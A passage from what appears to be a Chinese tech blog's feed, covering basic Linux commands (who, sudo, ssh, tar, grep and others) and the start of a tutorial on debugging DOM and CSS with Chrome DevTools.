src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643181873720-89a46e87-4c2a-45b3-b62d-eb0c712bcdc0.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643181873720-89a46e87-4c2a-45b3-b62d-eb0c712bcdc0.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="whvXd"></a></p><h3 id="5-who"><a href="#5-who" class="headerlink" title="5. who"></a>5. who</h3><p>who 命令用来返回用户名、主机信息、日期、时间。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># who</span><br><span class="line"></span><br><span class="line">mac      <span class="variable language_">console</span>  <span class="title class_">Jan</span> <span class="number">15</span> <span class="number">13</span>:<span class="number">55</span></span><br><span class="line">mac      ttys004  <span class="title class_">Jan</span> <span class="number">25</span> <span class="number">22</span>:<span class="number">52</span></span><br></pre></td></tr></table></figure><p><a name="jhEms"></a></p><h3 id="6-sudo"><a href="#6-sudo" class="headerlink" title="6. sudo"></a>6. sudo</h3><p>sudo 命令会以系统管理员的身份执行指令，也就是说，经由 sudo 所执行的指令就好像是 root 亲自执行的。</p><p><a name="DCXWm"></a></p><h3 id="7-history"><a href="#7-history" class="headerlink" title="7. history"></a>7. history</h3><p>history 命令用来查看历史记录。它显示了在终端中所执行过的所有命令的历史。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643185256227-830d30cb-3854-4b60-8e26-6afa13ec4f0a.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643185256227-830d30cb-3854-4b60-8e26-6afa13ec4f0a.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="ggGao"></a></p><h3 id="8-exit"><a href="#8-exit" class="headerlink" title="8. exit"></a>8. exit</h3><p>exit 命令用于退出当前的 shell。执行 exit 可使 shell 以指定的状态值退出。若不设置状态值参数，则 shell 以预设值退出。状态值 0 代表执行成功，其他值代表执行失败。exit 也可用在 script，离开正在执行的 script，回到 shell。</p><p><a name="n6ivn"></a></p><h1 id="五、其他"><a href="#五、其他" class="headerlink" title="五、其他"></a>五、其他<br /><br /></h1><p><a name="wY3MX"></a></p><h3 id="1-ssh"><a href="#1-ssh" class="headerlink" title="1. ssh"></a>1. ssh</h3><p>ssh 命令用于连接基于 Linux 的远程主机。要使用 root 用户连接远程主机，需要使用以下命令：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@<span class="number">192.168</span><span class="number">.4</span><span class="number">.21</span></span><br></pre></td></tr></table></figure><p><br />上面的命令将不支持 GUI，如果想使用 GUI 连接远程主机，需要使用下面的命令：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -<span class="variable constant_">XY</span> root@<span class="number">192.168</span><span class="number">.4</span><span class="number">.21</span></span><br></pre></td></tr></table></figure><p><a name="PZgOq"></a></p><h3 id="2-tar"><a href="#2-tar" class="headerlink" title="2. tar"></a>2. tar</h3><p>tar 命令用于备份文件。tar 是用来建立，还原备份文件的工具程序，它可以加入，解开备份文件内的文件。<br /><strong>压缩文件：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -czvf test.<span class="property">tar</span>.<span class="property">gz</span> a.<span class="property">c</span>   <span class="comment">//压缩 a.c文件为test.tar.gz a.c</span></span><br></pre></td></tr></table></figure><p><br /><strong>解压文件：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># tar -xzvf test.<span class="property">tar</span>.<span class="property">gz</span>  a.<span class="property">c</span></span><br></pre></td></tr></table></figure><p><a name="hYsz5"></a></p><h3 id="3-grep"><a href="#3-grep" class="headerlink" title="3. grep"></a>3. grep</h3><p>grep 命令用于查找文件里符合条件的字符串。如果发现某文件的内容符合所指定的范本样式，预设 grep 指令会把含有范本样式的那一列显示出来。若不指定任何文件名称，或是所给予的文件名为 -，则 grep 指令会从标准输入设备读取数据。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643181740916-5b0dd87c-b361-4880-9128-c3f254efcba4.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643181740916-5b0dd87c-b361-4880-9128-c3f254efcba4.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>可以使用-c 参数来计算重复的次数：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643186590083-5d917183-0b97-4f13-9a1d-e67321d75424.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643186590083-5d917183-0b97-4f13-9a1d-e67321d75424.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="ejgvL"></a></p><h3 id="4-ping"><a href="#4-ping" class="headerlink" title="4. ping"></a>4. ping</h3><p>ping 命令用于检测主机。执行 ping 指令会使用 ICMP 传输协议，发出要求回应的信息，若远端主机的网络功能没有问题，就会回应该信息，因而得知该主机运作正常。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643185750043-63988929-1e64-4b28-b92f-23d3b1d9a028.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643185750043-63988929-1e64-4b28-b92f-23d3b1d9a028.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="zWae1"></a></p><h3 id="5-man"><a href="#5-man" class="headerlink" title="5. man"></a>5. man</h3><p>man 命令用来查看 Linux 命令的使用手册，例如执行 man clear：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643186279430-41f0ca3c-3d54-4e23-9496-3cb4ba6bd525.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643186279430-41f0ca3c-3d54-4e23-9496-3cb4ba6bd525.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="wuL0u"></a></p><h3 id="6-wc"><a href="#6-wc" class="headerlink" title="6. wc"></a>6. wc</h3><p>wc 命令用于计算字数。利用 wc 指令我们可以计算文件的 Byte 数、字数、或是列数，若不指定文件名称、或是所给予的文件名为”-“，则 wc 指令会从标准输入设备读取数据。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643186731585-f6248493-ad67-420a-80b1-1ef676732a1a.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643186731585-f6248493-ad67-420a-80b1-1ef676732a1a.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 技巧 </tag>
            
            <tag> 服务器 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DevTools 调试技巧（1）</title>
      <link href="/2023/07/01/frontend/collection/skill/devtools-diao-shi-ji-qiao-1/"/>
      <url>/2023/07/01/frontend/collection/skill/devtools-diao-shi-ji-qiao-1/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><br /><a name="i2JYR"></a>## 1. Chrome DevTools功能简介<br /><br /><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976273-20295a0c-3f3f-442d-960a-174d76ebc8c9.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976273-20295a0c-3f3f-442d-960a-174d76ebc8c9.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>Chrome DevTools 由以下九部分组成：<br />● <strong>Element 元素面板</strong>：检查和调整页面，调式 DOM，调试 CSS<br />● <strong>Network 网络面板</strong>：调试请求，了解页面静态资源分布以及网页性能的检测<br />● <strong>Console 控制台面</strong>板：调试 JavaScript。查看 Console log 日志、交互式代码调试<br />● <strong>Sources 源代码资源面板</strong>：调试 JavaScript 页面源代码，进行断点调试代码<br />● <strong>Application 应用面板</strong>：查看、调试客户端存储，如 Cookie、LocalStorage、SessionStorage 等<br />● <strong>Performance 性能面板</strong>：查看网页的细节，细粒度对网页载入进行性能优化<br />● <strong>Memory 内存面板</strong>： JavaScript CPU 分析器，内存堆分析器<br />● <strong>Security 安全面板</strong>： 查看网页安全及证书问题<br />● <strong>LightHouse 面板</strong>：进行性能分析，给出优化建议</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612691203792-c2eb5e35-b918-4385-b398-15e0db6b2173.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612691203792-c2eb5e35-b918-4385-b398-15e0db6b2173.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>打开 Chrome 开发者工具<strong>快捷键</strong>：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976209-bf0154a9-8ce5-4ac3-8891-05f17ee0959b.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976209-bf0154a9-8ce5-4ac3-8891-05f17ee0959b.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="AIAoY"></a></p><h2 id="2-使用-Elements-调试-DOM"><a href="#2-使用-Elements-调试-DOM" class="headerlink" title="2. 使用 Elements 调试 DOM"></a>2. 使用 Elements 调试 DOM<br /><br /></h2><p><a name="H363z"></a></p><h3 id="2-1-查看编辑-HTML-和-DOM"><a href="#2-1-查看编辑-HTML-和-DOM" class="headerlink" title="2.1 查看编辑 HTML 和 DOM"></a>2.1 查看编辑 HTML 和 DOM</h3><p>可以在页面中选中 DOM，在 DOM 中反向定位到页面位置<br />可以对 HTML 和 DOM 进行编辑操作：<br />● 编辑内容<br />● 编辑属性<br />● 修改元素类型<br />● 调整 DOM 节点顺序<br />● 编辑 HTML 代码<br />● 删除、隐藏、增加、拷贝节点</p><p><a name="VFAr0"></a></p><h3 id="2-2-在-Console-中访问节点"><a href="#2-2-在-Console-中访问节点" class="headerlink" title="2.2 在 Console 中访问节点"></a>2.2 在 Console 中访问节点</h3><p>我们也可以在 console 访问节点：<br /><strong>（1）使用 document.querySelectorAll()访问</strong><br />我们进入 Element 模块，点击 ESC 键即可。这个方法返回一个 NodeList 数组，数组中是所有的选中的标签</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976236-7b224823-d436-4c1d-b3f6-8730c490e0d2.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976236-7b224823-d436-4c1d-b3f6-8730c490e0d2.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>（2）使用$0 快速访问选中的元素</strong><br />当我们选中一个元素时，会显示下面这样的提示：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976216-e418efec-2e40-4358-bfed-2f6dcacbd798.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976216-e418efec-2e40-4358-bfed-2f6dcacbd798.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>这也就是说，我们可以使用$0 来访问该元素，这样就会显示出我们选中的元素：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976249-e64201b8-70ed-4f45-b1f7-d885f900cfd8.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976249-e64201b8-70ed-4f45-b1f7-d885f900cfd8.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>（3）拷贝 JS Path 进行访问</strong><br />右键点击选中的元素，点击 Copy，选择 Copy JS path，即可复制该元素的路径，在 Console 中粘贴就会显示出对应的元素：<br />显示的结果：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976278-583fc3f2-e380-41da-b226-737192f7d037.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976278-583fc3f2-e380-41da-b226-737192f7d037.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="WRbF9"></a></p><h3 id="2-3-在-DOM-中断点调试"><a href="#2-3-在-DOM-中断点调试" class="headerlink" title="2.3 在 DOM 中断点调试"></a>2.3 在 DOM 中断点调试</h3><p>我们可以在以下几种情况下进行断点调试：<br /><strong>（1）属性修改时打断点</strong><br />我们将选中的 a 标签的 href 值进行修改：<br />步骤：右键点击元素 &#x3D;&gt; Break on &#x3D;&gt;attribute modifications ，这样就给元素打上断点，复制该元素的 JS path，并对其值进行修改，然后执行断点：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976218-70f114aa-177c-4a35-8241-70d21016f32e.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976218-70f114aa-177c-4a35-8241-70d21016f32e.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>执行后：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976282-24d2b858-2ffa-4b22-b61a-0d66b218c412.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976282-24d2b858-2ffa-4b22-b61a-0d66b218c412.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>（2）节点删除时打断点</strong><br />这个和上面的步骤类似，我们来删除一个 a 节点，需要使用其父元素的 removeChild 属性，断点设置为 Break on&#x3D;&gt; node removal：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976213-6ed9d272-251d-4920-b50b-fd7a81c47a72.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976213-6ed9d272-251d-4920-b50b-fd7a81c47a72.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>执行后（删除了左上角的“地图”标签）：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976256-a068dbda-aaea-400e-bb12-6557605ed61e.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976256-a068dbda-aaea-400e-bb12-6557605ed61e.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>（3）在子树修改时打断点</strong><br />这种方式，我们需要对父元素打断点，这次来删除左上角的“贴吧”标签，断点设置为 Break on&#x3D;&gt; subtree modifications：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976274-9d4b3e87-f95f-40af-96b6-c29655f82683.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976274-9d4b3e87-f95f-40af-96b6-c29655f82683.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>执行后：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976215-b26baeaf-9f3a-4d3c-bda4-8382063cd934.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976215-b26baeaf-9f3a-4d3c-bda4-8382063cd934.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="dt7i4"></a></p><h2 id="3-调试样式及-CSS"><a href="#3-调试样式及-CSS" class="headerlink" title="3. 调试样式及 CSS"></a>3. 调试样式及 CSS</h2><br /><a name="swUyG"></a>### 3.1 查看和编辑CSS查看一下百度输入框的样式：<p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976271-c73b6e4f-5042-4226-91bc-24623f7c868c.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976271-c73b6e4f-5042-4226-91bc-24623f7c868c.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>在这些样式中，从上到下，优先级依次降低。因为有些样式优先级较低，会被较高优先级的样式覆盖掉，所以会被划掉。我们可以对这些样式的属性或属性值进行修改，也可以划掉这个样式，使其隐藏。<br />可以通过 Filter 过滤需要的属性，过滤出来的属性会进行高亮显示：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976211-9eb4c92f-6b8f-4cf2-94b9-e7ff94929a53.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976211-9eb4c92f-6b8f-4cf2-94b9-e7ff94929a53.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>还可以实时查看该元素的盒模型：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976330-77ba9546-dbbf-41ab-8706-cbd0ac5a6002.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976330-77ba9546-dbbf-41ab-8706-cbd0ac5a6002.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="QEM0d"></a></p><h3 id="3-2-在元素中动态添加类与伪类"><a href="#3-2-在元素中动态添加类与伪类" class="headerlink" title="3.2 在元素中动态添加类与伪类"></a>3.2 在元素中动态添加类与伪类</h3><p>可以通过点击右上角的:hov、.cla 来动态的添加类与伪类，也可以对已有的类伪类进行查看：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976329-32e2b561-675c-4495-a372-db4f40998e1f.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976329-32e2b561-675c-4495-a372-db4f40998e1f.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>动态的添加类：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976279-885f275e-116a-427e-be32-050e44e01c11.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976279-885f275e-116a-427e-be32-050e44e01c11.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>添加伪类需要勾选上面的伪类类型，在进行添加。</p><p><a name="vfmJO"></a></p><h3 id="3-3-快速调试-CSS-数值及颜色图形动画等"><a href="#3-3-快速调试-CSS-数值及颜色图形动画等" class="headerlink" title="3.3 快速调试 CSS 数值及颜色图形动画等"></a>3.3 快速调试 CSS 数值及颜色图形动画等</h3><p>在右上角 element.style 右侧有三个点，鼠标移动上去就可以看到以下四个按钮：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976271-09ea238c-ac23-4f67-817d-c5bb4c08ddc0.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976271-09ea238c-ac23-4f67-817d-c5bb4c08ddc0.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>这四个按钮分别是：<br />●text-shadow：文字阴影<br />●box-shadow：盒子阴影<br />●color：文字颜色<br />●background-color：背景颜色<br />可以通过这四个按钮功能实现可视化的调节元素对应的样式。<br />（1）以 text-shadow 为例，可以通过调整数值来调整阴影的偏移位置以及模糊程度：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976324-199dbe3d-3132-4001-9a74-f2340a987451.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976324-199dbe3d-3132-4001-9a74-f2340a987451.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>（2）<strong>box-shadow：</strong></p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976370-73ff8e04-805f-4739-96a5-7374951164ef.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976370-73ff8e04-805f-4739-96a5-7374951164ef.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>（3）<strong>color：</strong></p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976299-fc619c2c-7486-4005-a680-83bfdf0a5c73.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976299-fc619c2c-7486-4005-a680-83bfdf0a5c73.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>（4）<strong>background-color</strong></p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976268-da3a4dfc-1503-460b-bfe3-c5c888d6b63d.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976268-da3a4dfc-1503-460b-bfe3-c5c888d6b63d.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>可以打开 Animations 来调试动画：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976370-fd4cc77b-49d6-4974-a040-0502b2f7af10.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976370-fd4cc77b-49d6-4974-a040-0502b2f7af10.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>我们给百度的输入搜索框加了一个:hover 之后高度变高的效果，这个工具就会录制这个动画的开始和离开，并显示在下方：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976278-4dd39a2d-cdcb-4b75-9c08-ce6fb0652bf3.png" class="lazyload placeholder" 